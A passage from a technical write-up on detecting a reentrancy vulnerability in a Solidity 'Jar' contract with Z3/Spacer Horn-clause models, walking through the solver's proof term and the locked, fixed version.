The following version of the definition of `Init` enabled me to get an answer in a few seconds.
```
(assert (forall ((b M) (tb BUINT)) (=> (Init b tb) (Jar b tb))))
```
Contrary to the source code, this new model allows any balance at the deployment.  Although the balance should be all zero at the moment of deployment, and updates of the balance should be done by the functions `deposit` and `withdraw`, Z3/Spacer could not manage the task to figure out a suitable state of the contract and transitions to it.

Another modification was limiting the size of the array, balance, and the maximal number for the uint to small numbers.  This means that for the proof search we assume the number of users is small and also assume our system allows only small numbers for representing the amount of asset.
In order to let the size of the balance array small, we give a custom definition for A, the data sort for the accounts.  For example, the following unit sort, namely, a singleton sort,
```
(declare-datatypes () ((Unit unit)))
(define-sort A () Unit)
```
is used to represent the case there is only one account holder in our system.
For the asset, we used the bitvector of length 2 representing numbers {0, 1, 2, 3}.

## Unsatisfiability proof

Z3 provides the following proof of unsatisfiability in seconds.  We are going to read off that it demonstrates the above mentioned divergent behaviors.
```
((set-logic HORN)
(declare-fun query!0 ((Array Unit (_ BitVec 2)) (_ BitVec 2) Unit (_ BitVec 2) (Array Unit (_ BitVec 2)) (_ BitVec 2) Int Int (Array Unit (_ BitVec 2)) (_ BitVec 2)) Bool)
(proof
(let ((?x2247 ((as const (Array Unit (_ BitVec 2))) (_ bv0 2))))
(let ((?x2347 (store ?x2247 unit (_ bv1 2))))
(let (($x2931 (query!0 ?x2347 (_ bv3 2) unit (_ bv0 2) ?x2247 (_ bv1 2) 0 0 ?x2247 (_ bv2 2))))
(let (($x534 (forall ((A (Array Unit (_ BitVec 2))) (B (_ BitVec 2)) )(Ext A B A B))))
(let ((@x3083 (asserted $x534)))
(let ((@x3082 ((_ hyper-res 0 0) @x3083 (Ext ?x2347 (_ bv2 2) ?x2347 (_ bv2 2)))))
(let (($x953 (forall ((A (Array Unit (_ BitVec 2))) (B Unit) (C (_ BitVec 2)) (D (_ BitVec 2)) (E (Array Unit (_ BitVec 2)))
                       (F (_ BitVec 2)) (G (Array Unit (_ BitVec 2))) (H (Array Unit (_ BitVec 2))) (I (_ BitVec 2)) )
                     (let (($x951 (and (Ext H I A C) (Ext A D E F) (not (= (select A B) (_ bv0 2))) (= D (bvadd C (bvmul (_ bv3 2) (select A B))))
                        (= G (store E B (_ bv0 2))) (bvule (select A B) C))))
           (=> $x951 (Ext H I G F))))
 ))
 (let ((@x2953 ((_ hyper-res 0 0 0 1 0 2) (asserted $x953) @x3082 ((_ hyper-res 0 0) @x3083 (Ext ?x2347 (_ bv1 2) ?x2347 (_ bv1 2))) (Ext ?x2347 (_ bv2 2) ?x2247 (_ bv1 2)))))
      (let (($x999 (forall ((A (Array Unit (_ BitVec 2))) (B Unit) (C (_ BitVec 2)) (D (_ BitVec 2)) (E (_ BitVec 2)) (F (Array Unit (_ BitVec 2)))
                            (G (_ BitVec 2)) (H (Array Unit (_ BitVec 2))) (I (_ BitVec 2)) (J (Array Unit (_ BitVec 2))) (K (_ BitVec 2)) (L (Array Unit (_ BitVec 2))) )
                           (let (($x997 (and (Ext A I J K) (Ext A E F G) (not (= (select A B) (_ bv0 2))) (= E (bvadd D (bvmul (_ bv3 2) (select A B))))
                                             (= I (bvadd D (bvmul (_ bv3 2) (select A B)))) (= H (store F B (_ bv0 2))) (= L (store J B (_ bv0 2)))
                                             (or (not (= L H)) (not (= K G))) (bvule (select A B) D))))
                                (=> $x997 (query!0 A D B C L K 0 0 H G)))) ))
           (mp ((_ hyper-res 0 0 0 1 0 2) (asserted $x999) @x2953 @x3082 $x2931) (asserted (=> $x2931 false)) false))))))))))))
```
In the same way as SMTLIB2, the output is in the S-expression of Lisp, where a list `(a b c)` denotes a function application `a(b, c)` in the common mathematical notation.
The proof begins with the specification of the logic, that is HORN as we specified in the original model definition.
The function <code>query!0</code> is boolean valued, and this boolean value is meant to stand for the negation of the security property.  Its arguments are corresponding to the universally quantified variables of the last assertion, the security property.  Recall that our unsatisfiability proof is an evidence of the fact that the negation of the security property holds under the condition that all the other assertions hold.  The negation of the security property is logically equivalent to an existential formula (due to the duality of the quantifiers).  An unsatisfiability proof by Z3 provides a concrete instantiation, i.e. the witness, of those existentially quantified variables, and the witness and logical reasoning present in the proof show the divergent behaviors of the smart contract.

The next line opens the proof object.
We see a sequence of definitions due to <code>let</code> construct.
Variables with the prefix <code>?</code> points to data such as a mapping and a bitvector.  Also, the prefix <code>$</code> means a variable pointing to a boolean value and <code>@</code> a proof.  The mapping is of the sort <code>Array Unit (_ BitVec 2)</code>, that is a mapping from the singleton to the bitvector of length 2.  Note that the singleton value is unique, and hence this mapping is isomorphic to the bitvector of length 2.

<code>?x2247</code> points to the balance whose value is constantly 0.  Here, <code>(_ bv0 2)</code> is 0 of the sort bitvector of length 2.  We denote it as an array <code>[0]</code>.

<code>?x2347</code> is the array <code>[1]</code>.  It is obtained by updating the 0th element (the unique element because of unit) of `?x2247` to be 1.

<code>$x2931</code> is a boolean value `(query!0 [1] 3 unit 0 [0] 1 0 0 [0] 2)`.  Those arguments are the witness found by Z3 to prove the negation of the security property.  Taking the goal formula in an existential form, the claim corresponding to `$x2931` looks as follows.
```
(and (Jar [1] 3)
     (T [1] 3 unit 0 [0] 1 0)
     (T [1] 3 unit 0 [0] 2 0)
     (= 0 0)
     (= 0 0)
     (not (and (= [0] [0]) (= 1 2))))
```
It is now clear from the first conjunct `(Jar [1] 3)` that this proof is considering the case when the contract's status is <code>([1], 3)</code>; the balance <code>[1]</code> indicates that the 0th account holder has the deposit which amounts to 1, and the asset of the contract amounts to 3.  It is apparently true because we have the assertion which makes Jar hold for an arbitrary state.  The next two conjuncts involving `T` describe transitions due to <code>withdraw</code>.  As the 5th and 6th arguments of `T` denote, one goes to the state of the contract <code>([0], 1)</code> and the other goes to <code>([0], 2)</code>.  Both are without no revert, as the 7th argument of `T` stands for the revert flag.  The last conjunct is true, because <code>(= 1 2)</code> is false, the whole conjunct is true.
At the end, the provided proof shows that <code>$x2931</code>, the negation of the security property, is indeed true.  It contradicts the security property we asserted, and hence Z3 successfully proves the unsatisfiability.

<code>$x534</code> is a formula <code>forall A, B, (Ext A B A B)</code>.

<code>@x3083</code> is defined to point to the proof of the claim <code>$x534</code>.
Due to our assertion on `Ext`, the formula <code>$x534</code> is apparently true.  The operator <code>asserted</code> makes a proof object of the formula whose validity comes from available assertions.

<code>@x3082</code> is a proof of <code>(Ext [1] 2 [1] 2)</code> obtained by the resolution method applied to <code>@x3083</code>.  The operator <code>(_ hyper-res ...)</code> does automated reasoning due to resolution, taking several arguments.  The first one is an already existing proof, and the last one is the desired conclusion obtained by applying resolution to the given proof.  Further arguments come inbetween, when there are additional proofs to supply for resolution.

<code>$x953</code> is an implication formula.  The premise is a conjunction defined as <code>$x951</code> and the conclusion is <code>(Ext H I G F)</code>, which looks as follows, omitting universal quantifier over `A`, `B`, ..., `H`, and `I`.
```
(=> (and (Ext H I A C)
         (Ext A D E F)
         (not (= (select A B) 0))
         (= D (+ C (* 3 (select A B))))
         (= G (store E B 0))
         (<= (select A B) C))
    (Ext H I G F))
```
Here, <code>=></code> stands for the logical implication.  For readability, we write `+`, `*`, and <code><=</code> for the arithmetical addition (`bvadd`), multiplication (`bvmul`), and less than or equal to (`bvule`) in bitvectors.

<code>@x2953</code> is a proof of <code>(Ext [1] 2 [0] 1)</code>.  It is obtained by resolution applied to four arguments.  The first one, <code>(asserted $x953)</code> is a proof of the formula <code>$x953</code> due to assertions.  The solver uses assertions in particular concerning `Q_alpha`, `Q_1`, `Q_2`, `Q_3`, `Q_omega`, `T`, and `Ext` to carry out the proof.  The last argument, i.e. the fourth one, is <code>(Ext [1] 2 [0] 1)</code> which is the conclusion of this proof <code>@x2953</code>.  In order to obtain this conclusion, it suffices to find suitable instantiations for quantified variables of `$x953` and to prove the premise `$x951` of the implication in the kernel of `$x953`.  The solver does it by means of the resolution using the second and the third arguments, .  They are necessary to prove the non-trivial conjuncts <code>(Ext H I A C)</code> and <code>(Ext A D E F)</code>.  The first one is due to a direct use of <code>@x3082</code>, and we now see <code>(Ext H I A C)</code> is <code>(Ext [1] 2 [1] 2)</code>.  On the other hand, <code>((_ hyper-res 0 0) @x3083 (Ext ?x2347 (_ bv1 2) ?x2347 (_ bv1 2)))</code> has the conclusion <code>(Ext [1] 1 [1] 1)</code> which comes by a simple instantiation of <code>@x3083</code> due to resolution.

As we have discussed so far, both <code>(Ext [1] 2 [1] 2)</code> and <code>(Ext [1] 2 [0] 1)</code> are proven.  They show the divergent state transitions due to external behavior of the contract.  From the state <code>([1], 2)</code>, one goes to the identical state <code>([1], 2)</code> and the other goes to <code>([0], 1)</code>.  It is indeed the cause of the vulnerability.

<code>$x999</code> is a universally quantified formula whose kernel is of the form <code>$x997 => (query!0 A D B C L K 0 0 H G)</code>.

<code>$x997</code> is defined to be the following conjunction formula.
```
(and (Ext A I J K)
     (Ext A E F G)
     (not (= (select A B) 0))
     (= E (+ D (* 3 (select A B))))
     (= I (+ D (* 3 (select A B))))
     (= H (store F B 0))
     (= L (store J B 0))
     (not (or (= L H) (not (= K G))))
     (<= (select A B) D))
```
Now we come to the final steps of the whole proof, which derives by modus ponens <code>mp</code> falsity from the proof of <code>$x2931</code> and the proof of its negation, i.e. <code>$x2931 => false</code>.  The latter one is the double negation of our security property, hence an assertion.
The former proof is due to resolution.  The first argument given to `(_ hyper-res 0 0 0 1 0 2)` is a proof of <code>$x999</code> by `asserted`.  Recall that <code>query!0</code> is a boolean valued function, and its boolean value is meant for the negation of the security property.  In order to prove it, it suffices to prove the conjunction formula inside the kernel of the security property formula, namely,
```
(and (Jar b tb)
     (T b tb s v b^ tb^ r^)
     (T b tb s v b_^ tb_^ r_^)
     (= r^ 0)
     (= r_^ 0)
     (not (and (= b^ b_^) (tb^ = tb_^))))
```
providing suitable substitutions for the quantified variables.
In order to prove <code>query!0 A D B C L K 0 0 H G</code>, the conclusion of the formula <code>$x999</code>, it suffices to prove that the corresponding instantiation of the above conjunction
```
(and (Jar A D)
     (T A D B C L K 0)
     (T A D B C H G 0)
     (= 0 0)
     (= 0 0)
     (not (and (= L H) (= K G))))
```
is straightforwardly implied from the conjunction formula <code>$x997</code> by means of the assertions concerning `Jar`, `T`, `Q_1`, `Q_2`, `Q_3`, and `Q_omega` in our model.  Notice that the premises concerning <code>Ext</code> is necessary as the body of the Horn clause concerning `Q_3` involves `Ext`.  By resolution, the body of the Horn clause <code>$x999</code> is all proven, thanks to the additionally supplied proofs <code>@x2953</code> and <code>@x3082</code>, which respectively claim <code>(Ext [1] 2 [0] 1)</code> and <code>(Ext [1] 2 [1] 2)</code>, and it gives a proof of <code>$x2931</code>, that is <code>(query!0 [1] 3 unit 0 [0] 1 0 0 [0] 2)</code>.
It clarifies that there are two diverging transactions as mentioned at the beginning of this section, and moreover it contradicts the asserted security property.

## Satisfiable result for secure Jar

Thanks to the lock object, the reentrancy is prevented and we get a satisfiable result of Z3, which means that there is no concern about the reentrancy vulnerability.
In order for a fully automated verification, <code>deposit</code> is also locked as well as <code>withdraw</code> is.  It makes it impossible to make a deposit by making use of reentrancy.  This is harmless to prohibit such a thing, and we consider this additional lock of <code>deposit</code> is acceptable for carrying out verification.  The SMT model for the fixed Jar contract doesn't require any essentially new feature.

## Future work

Our future work can be split into two kinds.  The one is about the performance of automated reasoning, and the second is about the optimality, generality, and automated extraction of the security property.  

An improvement for the performance of automated reasoning is crucial, because it indeed prevented us from us employing a proper security property and as a result we had to accept ad-hoc modifications to the security property.  Due to the same reason, it is also not possible to make use of an invariance, described below, at the moment.
One common strategy is to use several tools in parallel and make use of available results.  We will follow it and try other SMT solvers and theorem provers to overcome this issue.
We already tried the SMT solver cvc5, but it did not show a better performance over Z3/Spacer for our particular problem.

In order for fully automatic verification, an extraction procedure of the security property is necessary.  The ad-hoc modifications we had to give in the previous sections should be gone, although in order to get a witness of the security violation through an unsatisfiability proof, a specialized model still yields a sound result.
A more optimal description of the security property is available by means of an invariance.  For example, the difference between the amount of the asset of the Jar contract and the total sum of the deposits is constant, as long as we have calls to <code>deposit</code> and <code>withdraw</code>.

<!-- We used a modified model to let Z3 finish the task in a reasonable time frame. Concretely speaking, the state variable <code>balance</code> of type <code>mapping(address=>uint)</code> was modeled by an array of the length 1.  Although it is apparent that the obtained violation result of the security property does violate the security property in the unmodified model for our particular case, a soundness result of such model abstraction in general should be useful. -->

The implementation of the official Solidity compiler solc has already had features to generate CHC models from Solidity source codes.  Ideally, our future implementation work should be integrated with solc.

## External links

- SMTChecker and Formal Verification (https://docs.soliditylang.org/en/latest/smtchecker.html)
- What is a reentrancy attack in Solidity? https://www.alchemy.com/overviews/reentrancy-attack-solidity
- Hack Solidity: Reentrancy Attack https://hackernoon.com/hack-solidity-reentrancy-attack
- Getting proof trees from Spacer (https://github.com/Z3Prover/z3/issues/4863)
- Hyper-resolution rule (https://github.com/Z3Prover/z3/blob/master/src/api/z3_api.h#L748)

## References

<a id="1">[1]</a>
Leonardo Alt, Martin Blicha, Antti E. J. Hyvärinen, Natasha Sharygina:
SolCMC: Solidity Compiler's Model Checker. CAV (1) 2022: 325-338

<a id="2">[2]</a>
Matteo Marescotti, Rodrigo Otoni, Leonardo Alt, Patrick Eugster, Antti E. J. Hyvärinen, Natasha Sharygina:
Accurate Smart Contract Verification Through Direct Modelling. ISoLA (3) 2020: 178-194
